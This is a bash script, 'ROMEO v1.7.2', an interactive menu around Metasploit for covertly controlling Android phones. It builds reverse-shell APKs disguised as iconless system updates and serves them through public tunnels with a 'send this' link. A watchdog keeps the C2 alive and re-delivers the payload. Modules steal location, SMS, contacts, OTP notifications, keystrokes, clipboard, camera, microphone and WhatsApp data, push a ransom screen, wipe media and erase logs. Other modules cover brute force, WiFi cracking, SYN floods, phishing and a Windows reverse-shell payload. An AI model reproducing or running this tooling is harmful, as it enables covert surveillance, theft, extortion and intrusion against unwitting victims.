#!/usr/bin/env bash
#===============================================================#
#   ROMEO v1.7.2 - Android control center - made by rodseo      #
#===============================================================#
set -u
R='\033[0m'; G='\033[1;32m'; C='\033[1;36m'; Y='\033[1;33m'; E='\033[1;31m'; M='\033[1;35m'
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LPORT="${LPORT:-4444}"
WL="${WL:-/usr/share/wordlists/rockyou.txt}"
mkdir -p "$DIR/web" "$DIR/tools" "$DIR/loot"
die(){ printf "${E}%s${R}\n" "$1"; }
ok(){ printf "${G}%s${R}\n" "$1"; }
lhost(){ cut -d: -f1 "$DIR/.state" 2>/dev/null; }
lport(){ cut -d: -f2 "$DIR/.state" 2>/dev/null; }
lanip(){ ip -4 route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}'; }

banner(){
clear
printf "${M}"
cat <<'EOF'
  ____   ___  __  __ _____ ___
 |  _ \ / _ \|  \/  | ____/ _ \
 | |_) | | | | |\/| |  _|| | | |
 |  _ <| |_| | |  | | |__| |_| |
 |_| \_\\___/|_|  |_|_____\___/
EOF
printf "${R}   v1.7.2   made by rodseo\n"
printf "${C}   c2:${R} %s   ${C}page:${R} %s\n\n" "$(cat "$DIR/.state" 2>/dev/null || echo none)" "$(cat "$DIR/.public" 2>/dev/null || echo lan-only)"
}

live(){ ss -ltn 2>/dev/null | grep -q ":$LPORT "; }
need_live(){ live || { die "No listener. Run 1 first."; return 1; }; }
msf(){ local rc; rc="$(mktemp /tmp/romeo.XXXXXX.rc)"
  { echo "sessions -i 1"; printf '%s\n' "$1"; echo "exit -y"; } >"$rc"
  msfconsole -q -r "$rc"; rm -f "$rc"; }
serve(){ pkill -f "http.server 8080" 2>/dev/null
  ( cd "$DIR/web" && nohup python3 -m http.server 8080 >/dev/null 2>&1 & ); sleep 1; }

#============== 1 listener ==============
m_listen(){ banner; die "Waiting. Ctrl+C to stop."
  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; \
set LPORT $LPORT; set ExitOnSession false; set AutoRunScript post/multi/manage/shell_to_meterpreter; exploit -j -z; sessions -l"; }

#============== 2 location ==============
m_loc(){ need_live || return
  msf $'geolocate\nshell dumpsys location | grep -m4 -E "gps|network"'
  printf "${Y}drop the lat,long in maps${R}\n"; }

#============== 3 spy ==============
m_spy(){ while :; do banner; printf "${C}SPY${R}\n1 shot 2 mic20 3 sms 4 contacts 5 calls 0 back\n> "; read -r s
 case $s in 1) msf 'screenshot';; 2) msf 'record_mic -d 20';; 3) msf 'dump_sms';;
 4) msf 'dump_contacts';; 5) msf 'dump_calllog';; 0) return;; esac; read -rp "enter..." _; done; }

#============== 4 apps ==============
m_apps(){ need_live || return; msf 'app_list'
  read -rp "launch package (blank skip): " p; [ -n "$p" ] && msf "app_run $p"; }

#============== 5 camera ==============
m_cam(){ need_live || return; msf $'webcam_list\nwebcam_snap -i 1\nwebcam_snap -i 2'
  printf "${Y}empty list = screen locked, unlock and retry${R}\n"; }

#============== 6 sms ==============
m_sms(){ need_live || return; read -rp "number: " n; read -rp "text: " t
  msf "send_sms -d $n -t \"$t\""; }

#============== 7 lock ==============
m_lock(){ need_live || return; msf $'shell input keyevent 223\nshell input keyevent 26'; ok "locked"
  read -rp "torch on? [y/N] " a; [ "${a:-n}" = y ] && \
  msf $'shell cmd flashlight on || shell su -c "echo 255 > /sys/class/leds/flashlight/brightness"'; }

#============== 8 ransom ==============
m_ransom(){ need_live || return; serve; read -rp "fake code [ROMEO-2026]: " c; c="${c:-ROMEO-2026}"
  local u; u="http://$(lanip):8080"; [ -s "$DIR/.public" ] && u="$(cat "$DIR/.public")"
  msf "shell am start -a android.intent.action.VIEW -d \"$u/ransom.html?c=$c\""; ok pushed; }

#============== 9 wipe ==============
m_wipe(){ need_live || return; printf "${E}deletes photos/videos/docs on the phone${R}\n"
  read -rp "type ERASE: " a; [ "$a" = ERASE ] || { die aborted; return; }
  msf $'shell rm -rf /sdcard/DCIM /sdcard/Pictures /sdcard/Download/* /sdcard/Documents /sdcard/Movies /sdcard/WhatsApp/Media'; ok wiped; }

#============== 10 ghost sweep ==============
m_ghost(){ need_live || return
  msf $'shell rm -f /sdcard/Download/*.apk /sdcard/Download/*.html\nshell logcat -c\nshell rm -f /sdcard/.kb.log'
  ok "apk copies + logs erased"; }

#============== 11 keylogger ==============
m_keylog(){ need_live || return
  printf "${C}1${R} start  ${C}2${R} pull+decode  ${C}3${R} stop\n> "; read -r k
  case $k in
   1) msf 'shell sh -c "getevent -lt > /sdcard/.kb.log 2>&1 &"'; ok running;;
   2) msf 'download /sdcard/.kb.log';;
   3) msf 'shell pkill getevent'; ok stopped;;
  esac; }

#============== 12 OTP / notifications ==============
m_notify(){ need_live || return
  msf 'shell dumpsys notification --noredact | grep -E "android.title|android.text|pkg=" | head -80'; }

#============== 13 clipboard ==============
m_clip(){ need_live || return; msf 'shell dumpsys clipboard'; }

#============== 14 file manager ==============
m_files(){ need_live || return; read -rp "path [/sdcard]: " p; p="${p:-/sdcard}"
  while :; do msf "shell ls -la $p"; printf "${C}1${R} cd ${C}2${R} pull ${C}3${R} rm ${C}4${R} push ${C}0${R} back\n> "; read -r f
   case $f in
    1) read -rp "dir: " p;;
    2) read -rp "file: " x; msf "download $x";;
    3) read -rp "file: " x; msf "shell rm -rf $x";;
    4) read -rp "local file: " x; read -rp "remote dest: " y; msf "upload $x $y";;
    0) return;; esac; done; }

#============== 15 live screen ==============
m_liveview(){ need_live || return; die "streaming, Ctrl+C to stop"
  while :; do msf 'screenshot'; sleep 2; done; }

#============== 16 whatsapp / telegram ==============
m_wa(){ need_live || return
  msf $'shell ls -la /sdcard/Android/media/com.whatsapp/WhatsApp/Databases\nshell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media'
  read -rp "pull a DB file name (blank skip): " d
  [ -n "$d" ] && msf "download /sdcard/Android/media/com.whatsapp/WhatsApp/Databases/$d"
  printf "${Y}open with: sqlitebrowser${R}\n"; }

#============== 17 keep-alive ==============
m_keep(){ need_live || return
  msf $'shell dumpsys deviceidle whitelist +com.metasploit.stage\nshell am set-standby-bucket com.metasploit.stage active\nshell cmd power set-adaptive-battery 0'
  ok "process pinned awake"; }

#============== 18 tunnel ==============
m_tunnel(){ local out="$DIR/.tunnel.log" h="" p=""; : >"$out"; pkill -f "cloudflared tunnel --url tcp" 2>/dev/null
  if command -v cloudflared >/dev/null; then
    nohup cloudflared tunnel --url "tcp://localhost:$LPORT" --no-autoupdate >"$out" 2>&1 &
    for i in $(seq 1 25); do
      h=$(grep -oE 'tcp://[A-Za-z0-9.-]+' "$out" | head -1 | sed 's|tcp://||')
      p=$(grep -oE 'trycloudflare\.com:[0-9]+' "$out" | head -1 | cut -d: -f2)
      [ -n "$h" ] && [ -n "$p" ] && break; sleep 1; done
  fi
  if [ -z "$h" ] && command -v ngrok >/dev/null; then
    nohup ngrok tcp "$LPORT" --log=stdout >"$out" 2>&1 & sleep 4
    local j; j=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null)
    h=$(printf '%s' "$j" | grep -oE 'tcp://[^"]+' | head -1 | sed 's|tcp://||' | cut -d: -f1)
    p=$(printf '%s' "$j" | grep -oE 'tcp://[^"]+' | head -1 | cut -d: -f2)
  fi
  if [ -z "$h" ]; then
    nohup ssh -o StrictHostKeyChecking=no -R 0:localhost:"$LPORT" serveo.net >"$out" 2>&1 &
    for i in $(seq 1 20); do
      h=$(grep -oE 'serveo\.net:[0-9]+' "$out" | head -1 | cut -d: -f1)
      p=$(grep -oE 'serveo\.net:[0-9]+' "$out" | head -1 | cut -d: -f2)
      [ -n "$p" ] && break; sleep 1; done
  fi
  if [ -n "$h" ] && [ -n "$p" ]; then printf '%s:%s' "$h" "$p" >"$DIR/.state"; ok "c2 endpoint $h:$p"
  else printf '%s:%s' "$(lanip)" "$LPORT" >"$DIR/.state"; die "tunnel failed, LAN mode only"; fi; }

#============== 33 public page link ==============
m_expose(){ local out="$DIR/.expose.log" url=""; : >"$out"
  pkill -f "cloudflared tunnel --url http://localhost:8080" 2>/dev/null
  if command -v cloudflared >/dev/null; then
    nohup cloudflared tunnel --url http://localhost:8080 --no-autoupdate >"$out" 2>&1 &
    for i in $(seq 1 25); do
      url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$out" | head -1)
      [ -n "$url" ] && break; sleep 1; done
  fi
  if [ -z "$url" ]; then
    nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run >"$out" 2>&1 &
    for i in $(seq 1 20); do
      url=$(grep -oE 'https://[a-z0-9-]+\.lhr\.life' "$out" | head -1)
      [ -n "$url" ] && break; sleep 1; done
  fi
  if [ -n "$url" ]; then printf '%s' "$url" >"$DIR/.public"; ok "public page: $url/dl.html"
  else die "expose failed, LAN link only"; fi; }

#============== 19 craft + mask + fake update ==============
m_craft(){ [ -s "$DIR/.state" ] || { die "no endpoint, opening tunnel first"; m_tunnel; }
  read -rp "name shown to victim [System_Update]: " nm; nm="${nm:-System_Update}"
  read -rp "file name [update]: " f; f="${f:-update}"
  read -rp "ghost build (no icon)? [Y/n] " g
  msfvenom -p android/meterpreter/reverse_tcp LHOST="$(lhost)" LPORT="$(lport)" -o "$DIR/web/$f.apk" || { die msfvenom failed; return; }
  printf '%s|%s|%s' "$nm" "$f" "${g:-y}" > "$DIR/.payload"
  if [ "${g:-y}" = y ] && command -v apktool >/dev/null && command -v apksigner >/dev/null; then
    ( cd "$DIR/loot" && rm -rf m && apktool d -f "$DIR/web/$f.apk" -o m >/dev/null 2>&1 && \
      sed -i "s/android:label=\"[^\"]*\"/android:label=\"$nm\"/" m/AndroidManifest.xml && \
      python3 - <<'PY'
import re,io
p="m/AndroidManifest.xml"; s=open(p).read()
s=s.replace('<category android:name="android.intent.category.LAUNCHER" />','')
open(p,"w").write(s)
PY
      apktool b m -o "$DIR/web/$f.apk" >/dev/null 2>&1 && \
      apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android "$DIR/web/$f.apk" >/dev/null 2>&1 ) \
      && ok "ghost build ready (iconless)" || die "apktool step failed, plain APK kept"
  fi
  sed "s|__APK__|$f.apk|g; s|__NAME__|$nm|g; s|__SIZE__|$(du -h "$DIR/web/$f.apk" | cut -f1)|g" \
    "$DIR/web/update.html" > "$DIR/web/dl.html"
  serve; ok "LAN link: http://$(lanip):8080/dl.html"
  m_expose
  [ -s "$DIR/.public" ] && ok "SEND THIS: $(cat "$DIR/.public")/dl.html"
  read -rp "push page to an owned phone now? [y/N] " a
  if [ "${a:-n}" = y ] && need_live; then
    local u; u="http://$(lanip):8080"; [ -s "$DIR/.public" ] && u="$(cat "$DIR/.public")"
    msf "shell am start -a android.intent.action.VIEW -d \"$u/dl.html\""; fi; }

#============== 20 tor ==============
m_tor(){ systemctl start tor 2>/dev/null || service tor start 2>/dev/null; sleep 2
  printf "${Y}exit:${R} "; curl -s --max-time 20 --socks5-hostname 127.0.0.1:9050 https://ifconfig.me || die "tor down"; echo; }

#============== 21 brute force center ==============
m_brute(){ while :; do banner
  printf "${C}BRUTE${R}\n1 ssh 2 telnet 3 ftp 4 http-form 5 adb 6 rtsp cam 7 wifi 0 back\n> "; read -r b
  case $b in
   0) return;; 7) m_wifihand; continue;;
   6) read -rp "camera ip: " t; command -v cameradar >/dev/null && cameradar --target "$t" || die "install cameradar";;
   5) read -rp "phone ip: " t; timeout 6 adb connect "$t:5555" && adb -s "$t:5555" shell getprop ro.product.model;;
   *) case $b in 1) sv=ssh;; 2) sv=telnet;; 3) sv=ftp;; 4) sv=http-get;; *) continue;; esac
      read -rp "target ip: " t; read -rp "port: " pt
      read -rp "userlist [/usr/share/wordlists/users.txt]: " u
      [ -f "${u:-}" ] || { printf "admin\nroot\nuser\nubnt\npi\nsupport\n" > "$DIR/loot/users.txt"; u="$DIR/loot/users.txt"; }
      [ -f "$WL" ] || { die "wordlist missing: $WL"; continue; }
      hydra -L "$u" -P "$WL" -t 4 -f "$t" "$sv" -s "$pt";;
  esac; read -rp "enter..." _; done; }

#============== wifi ==============
m_wifihand(){ read -rp "iface [wlan0]: " i; i="${i:-wlan0}"
  airmon-ng start "$i" >/dev/null 2>&1
  local mon; mon=$(iw dev | awk '/Interface/{print $2}' | grep -m1 mon)
  [ -z "$mon" ] && { die "monitor mode failed"; return; }
  die "scanning 15s"; timeout 15 airodump-ng "$mon"
  read -rp "BSSID: " bs; read -rp "channel: " ch
  airodump-ng -c "$ch" --bssid "$bs" -w "$DIR/loot/hs" "$mon" >/dev/null 2>&1 & sleep 6
  aireplay-ng -0 5 -a "$bs" "$mon" >/dev/null 2>&1; sleep 8; pkill airodump-ng
  [ -f "$WL" ] && aircrack-ng "$DIR"/loot/hs*.cap -w "$WL" || die "no wordlist"; }

m_wifi(){ while :; do banner
  printf "${C}WIFI${R}\n1 airgeddon 2 wifite 3 bettercap 4 pmkid 5 handshake 6 deauth 7 macchanger 0 back\n> "; read -r w
  case $w in
   0) return;;
   1) [ -d "$DIR/tools/airgeddon" ] || git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon "$DIR/tools/airgeddon"
      ( cd "$DIR/tools/airgeddon" && bash airgeddon.sh );;
   2) command -v wifite >/dev/null && wifite || die "apt install wifite";;
   3) command -v bettercap >/dev/null && bettercap || die "apt install bettercap";;
   4) read -rp "iface: " i; read -rp "out name [pmkid]: " o; hcxdumptool -i "$i" -o "$DIR/loot/${o:-pmkid}.pcapng" --enable_status=1;;
   5) m_wifihand;;
   6) read -rp "iface: " i; read -rp "bssid: " bs; mdk4 "$i" d -B "$bs";;
   7) read -rp "iface: " i; read -rp "mac: " m; ip link set "$i" down; macchanger -m "$m" "$i"; ip link set "$i" up;;
  esac; read -rp "enter..." _; done; }

#============== smart tv ==============
m_tv(){ read -rp "tv ip: " t; [ -z "$t" ] && return
  banner; printf "${C}TV${R}\n1 probe 2 launch youtube 3 telnet brute 4 rtsp 0 back\n> "; read -r c
  case $c in
   1) nmap -Pn -p 8008,8009,554,2323,8080,9999,1900 "$t";;
   2) read -rp "youtube video id: " v
      curl -s -m6 -X POST -H "Content-Type: text/plain" -d "v=$v" "http://$t:8008/apps/YouTube"; ok "sent";;
   3) hydra -L "$DIR/loot/users.txt" -P "$WL" -f "$t" telnet -s 23;;
   4) curl -s -m5 -i "rtsp://$t:554/" | head -8;;
  esac; }

#============== iot / cameras ==============
m_iot(){ read -rp "subnet (e.g. 192.168.1.0/24): " n; [ -z "$n" ] && return
  nmap -Pn -p 23,80,554,8008,8080,37777,5555 --open "$n" -oG "$DIR/loot/iot.txt"
  grep -E "Ports:" "$DIR/loot/iot.txt" | head -40
  read -rp "exploit a host with routersploit? [y/N] " a
  if [ "${a:-n}" = y ]; then
    [ -d "$DIR/tools/routersploit" ] || git clone --depth 1 https://github.com/threat9/routersploit "$DIR/tools/routersploit"
    ( cd "$DIR/tools/routersploit" && python3 rsf.py ); fi; }

#============== ddos ==============
m_ddos(){ read -rp "target: " t; read -rp "port [80]: " p; read -rp "secs [60]: " d
  timeout "${d:-60}" hping3 --flood -S -p "${p:-80}" "$t"; }

#============== phishing ==============
m_phish(){ [ -d "$DIR/tools/zphisher" ] || git clone --depth 1 https://github.com/htr-tech/zphisher "$DIR/tools/zphisher"
  ( cd "$DIR/tools/zphisher" && bash zphisher.sh ); }

#============== webcam pc ==============
m_webcam(){ read -rp "victim ip: " ip; read -rp "port [4445]: " p; p="${p:-4445}"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$(lanip)" LPORT="$p" -f exe -o "$DIR/loot/cam.exe"
  ok "send loot/cam.exe"; printf "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $(lanip); set LPORT $p; exploit\"\n"
  printf "${Y}target %s -> webcam_list; webcam_snap -i 1${R}\n" "$ip"; }

#============== hackerpro ==============
m_hp(){ [ -d "$DIR/tools/hackerpro" ] || git clone --depth 1 https://github.com/jaykali/hackerpro "$DIR/tools/hackerpro"
  ( cd "$DIR/tools/hackerpro" && bash hackerpro.sh ); }

#============== osint ==============
m_osint(){ read -rp "domain/email/username: " q; [ -z "$q" ] && return
  command -v theHarvester >/dev/null && theHarvester -d "$q" -b all -l 200
  command -v sherlock >/dev/null && sherlock "$q"; }

#============== 32 watchdog ==============
WATCH_PID="$DIR/.watch.pid"
wd_alive(){ [ -f "$WATCH_PID" ] && kill -0 "$(cat "$WATCH_PID")" 2>/dev/null; }

wd_rebuild(){
  local nm f g h p
  [ -f "$DIR/.payload" ] || return 1
  IFS='|' read -r nm f g < "$DIR/.payload"
  h="$(lhost)"; p="$(lport)"
  [ -z "${h:-}" ] || [ -z "${p:-}" ] && return 1
  msfvenom -p android/meterpreter/reverse_tcp LHOST="$h" LPORT="$p" -o "$DIR/web/$f.apk" >/dev/null 2>&1 || return 1
  if [ "$g" = y ] && command -v apktool >/dev/null && command -v apksigner >/dev/null; then
    ( cd "$DIR/loot" && rm -rf m && apktool d -f "$DIR/web/$f.apk" -o m >/dev/null 2>&1 && \
      sed -i "s/android:label=\"[^\"]*\"/android:label=\"$nm\"/" m/AndroidManifest.xml && \
      sed -i 's|<category android:name="android.intent.category.LAUNCHER" />||' m/AndroidManifest.xml && \
      apktool b m -o "$DIR/web/$f.apk" >/dev/null 2>&1 && \
      apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android "$DIR/web/$f.apk" >/dev/null 2>&1 )
  fi
  sed "s|__APK__|$f.apk|g; s|__NAME__|$nm|g; s|__SIZE__|$(du -h "$DIR/web/$f.apk" | cut -f1)|g" \
    "$DIR/web/update.html" > "$DIR/web/dl.html"
}

wd_loop(){
  local ep h p c=0 dl
  echo "$(date +%T) watchdog up (port $LPORT)" >>"$DIR/.watch.log"
  while :; do
    c=$((c+1))
    if ! live; then
      msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j -z" >/dev/null 2>&1 &
      echo "$(date +%T) listener restarted" >>"$DIR/.watch.log"; sleep 10
    fi
    pgrep -f "http.server 8080" >/dev/null || { serve; echo "$(date +%T) server restarted" >>"$DIR/.watch.log"; }
    if [ -s "$DIR/.public" ]; then
      if ! timeout 6 curl -fsS -o /dev/null "$(cat "$DIR/.public")/dl.html" 2>/dev/null; then
        echo "$(date +%T) public link dead, re-exposing" >>"$DIR/.watch.log"
        m_expose >>"$DIR/.watch.log" 2>&1
      fi
    fi
    ep="$(cat "$DIR/.state" 2>/dev/null)"; h="${ep%%:*}"; p="${ep##*:}"
    if [ -n "${h:-}" ] && [ "${h:-}" != "$(lanip)" ]; then
      if ! timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then
        echo "$(date +%T) c2 tunnel dead ($ep) rebuilding" >>"$DIR/.watch.log"
        m_tunnel >>"$DIR/.watch.log" 2>&1
        if wd_rebuild; then
          echo "$(date +%T) payload rebuilt for $(cat "$DIR/.state")" >>"$DIR/.watch.log"
          if live && [ -s "$DIR/web/dl.html" ]; then
            dl="http://$(lanip):8080/dl.html"; [ -s "$DIR/.public" ] && dl="$(cat "$DIR/.public")/dl.html"
            msfconsole -q -x "sessions -i 1; shell am start -a android.intent.action.VIEW -d \"$dl\"; exit -y" >/dev/null 2>&1
            echo "$(date +%T) re-delivered $dl" >>"$DIR/.watch.log"
          fi
        fi
      fi
    fi
    if [ $((c % 4)) -eq 0 ]; then
      echo "$(date +%T) sessions: $(msfconsole -q -x 'sessions -l; exit' 2>/dev/null | grep -cE '^[0-9]+ ')" >>"$DIR/.watch.log"
    fi
    sleep 15
  done
}

m_watch(){ while :; do banner
  printf "${C}WATCHDOG${R}\n1 start 2 stop 3 status 4 log 0 back\n> "; read -r w
  case $w in
   1) if wd_alive; then die "already running pid $(cat "$WATCH_PID")"
      else nohup bash "$DIR/romeo.sh" --watch >>"$DIR/.watch.log" 2>&1 & echo $! >"$WATCH_PID"; ok "watchdog pid $!"; fi;;
   2) [ -f "$WATCH_PID" ] && kill "$(cat "$WATCH_PID")" 2>/dev/null; rm -f "$WATCH_PID"; ok stopped;;
   3) wd_alive && { ok "running pid $(cat "$WATCH_PID")"; tail -5 "$DIR/.watch.log" 2>/dev/null; } || die stopped;;
   4) tail -30 "$DIR/.watch.log" 2>/dev/null;;
   0) return;;
  esac; read -rp "enter..." _; done; }

#============== 30 self destruct ==============
m_burn(){ printf "${E}uninstall, wipe traces, kill sessions${R}\n"; read -rp "type BURN: " a
  [ "$a" = BURN ] || { die aborted; return; }
  msf $'shell rm -f /sdcard/Download/*.apk /sdcard/Download/*.html /sdcard/.kb.log\nshell logcat -c\napp_uninstall com.metasploit.stage\nsessions -K'
  pkill -f msfconsole; pkill -f "http.server 8080"; pkill -f hping3
  pkill -f "cloudflared tunnel"; pkill -f "nokey@localhost.run"
  [ -f "$WATCH_PID" ] && kill "$(cat "$WATCH_PID")" 2>/dev/null; rm -f "$WATCH_PID"
  rm -f /tmp/romeo.*.rc "$DIR/.state" "$DIR/.public"; ok "clean"; }

#============== 31 deps ==============
m_deps(){ bash "$DIR/install.sh"; }

#============== watch entry ==============
if [ "${1:-}" = "--watch" ]; then wd_loop; exit 0; fi

#============== menu ==============
while :; do banner
cat <<'EOF'
 -- SESSION --            -- GHOST --              -- ARSENAL --
  1  Listener              10 Ghost sweep            21 Brute force center
  2  Location              11 Keylogger              22 WiFi suite
  3  Spy                   12 OTP / notifications    23 Smart TV
  4  Apps                  13 Clipboard              24 IoT / cameras
  5  Camera                14 File manager           25 DDoS
  6  Send SMS              15 Live screen            26 Phishing (Zphisher)
  7  Lock + torch          16 WhatsApp / Telegram    27 Webcam (PC)
  8  Ransom screen         17 Keep-alive             28 HackerPro
  9  Wipe                                           29 OSINT
 -- DELIVERY --
  18 C2 tunnel             19 Craft + mask + update
  20 Tor                   30 SELF DESTRUCT      31 Install deps
  32 Watchdog (auto-heal)  33 Public page link       0 Exit
EOF
printf "> "; read -r o
case $o in
 1) m_listen;; 2) m_loc;; 3) m_spy;; 4) m_apps;; 5) m_cam;; 6) m_sms;; 7) m_lock;;
 8) m_ransom;; 9) m_wipe;; 10) m_ghost;; 11) m_keylog;; 12) m_notify;; 13) m_clip;;
 14) m_files;; 15) m_liveview;; 16) m_wa;; 17) m_keep;; 18) m_tunnel;; 19) m_craft;;
 20) m_tor;; 21) m_brute;; 22) m_wifi;; 23) m_tv;; 24) m_iot;; 25) m_ddos;; 26) m_phish;;
 27) m_webcam;; 28) m_hp;; 29) m_osint;; 30) m_burn;; 31) m_deps;; 32) m_watch;; 33) m_expose;;
 0) exit 0;; *) die "no such option";;
esac
echo; read -rp "enter to return..." _
done